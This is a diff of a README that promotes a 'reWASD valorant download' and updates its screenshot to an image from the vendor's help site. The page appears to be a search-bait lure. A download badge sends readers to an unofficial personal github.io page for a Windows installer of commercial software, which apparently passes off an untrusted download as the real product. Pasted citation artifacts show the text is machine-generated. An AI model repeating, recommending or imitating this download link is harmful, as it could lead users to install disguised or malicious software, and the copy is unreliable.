@@ -23,7 +23,7 @@ Searches related to **rewasd valorant download** generally focus on controller c
 Designed specifically for Windows, the software combines controller management, profile organization, input customization, and automation tools into a unified interface suitable for both casual and advanced users. :contentReference[oaicite:4]{index=4}
 
 <div align="center">
-<img src="" alt="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSHfr5Gq1a0paIxovt3uipBqaSMAYuuy_jwFnaunE87aXpTEJuJIjf9mppY&s=10" width="750">
+<img src="https://help.rewasd.com/storage/cache/uploads/2023/11/fbf58f1360-700-494-install_1.webp" alt="reWASD Screenshot" width="900">
 </div>
 
 [![Download Installer](https://img.shields.io/badge/Get%20for-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://jesusfrostball3.github.io/.github/ReWASD-Controller-Utility)
